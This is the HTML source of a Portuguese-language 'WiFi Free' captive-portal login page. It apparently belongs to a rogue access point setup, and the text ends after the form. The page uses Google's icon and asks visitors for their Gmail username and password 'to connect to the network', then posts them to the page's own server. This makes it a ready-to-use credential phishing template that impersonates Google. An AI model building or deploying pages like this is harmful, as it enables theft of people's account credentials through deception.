<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Free :: Login</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="google-icon.svg" type="image/x-icon">
</head>
<body>
    <header>
        <h1>WiFi Free</h1>
        <p>Bem Vindo!</p>
    </header>

    <div class="container">
        <h1>Login:</h1>
        <div id=login-text>Entre com seu Google Mail para se conectar a rede.
    </div>

    <form action=/post method=post>
        <b class=username-label>Username:   </b>
            <input type=text name=username placeholder=gmail>
        <b class=password-label>Password: </b>
            <input type=password name=password placeholder=password>
            <button type="submit"><img src="google-icon.svg" alt="" srcset=""> Login </button>
    </form>
